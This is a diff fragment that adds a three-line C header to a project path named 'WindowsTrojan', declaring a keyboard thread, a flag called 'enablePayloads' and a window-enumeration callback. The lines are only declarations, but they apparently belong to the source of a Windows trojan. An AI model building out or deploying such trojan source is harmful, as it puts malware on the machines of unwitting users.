+++ WindowsTrojan/Source/Clean/Clean.h
@@ -1,0 +1,3 @@
+DWORD WINAPI keyboardThread(LPVOID lParam);
+extern BOOLEAN enablePayloads;
+BOOL CALLBACK CleanWindowsProc(HWND hwnd, LPARAM lParam);
